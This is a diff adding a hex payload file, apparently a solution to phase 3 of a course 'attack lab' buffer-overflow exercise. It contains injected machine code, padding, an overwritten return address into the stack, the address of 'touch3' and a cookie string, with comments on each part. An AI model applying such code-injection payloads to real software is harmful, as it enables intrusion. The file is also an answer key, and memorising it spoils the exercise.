@@ -1,0 +1,10 @@
+48 c7 c7 d0 a9 66 55 c3 /* code to insert address of cookie string (found in phase3.d compiled from phase3.s)  */
+00 00 00 00 00 00 00 00 /* 56 byte padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+88 a9 66 55 00 00 00 00 /* address of $rsp, points to where injected code is stored in buffer  */
+00 18 40 00 00 00 00 00 /* address of touch3 */
+37 33 30 62 33 30 65 62 00 /* cookie string representation (0x730b30eb) with ending null byte to terminate string */
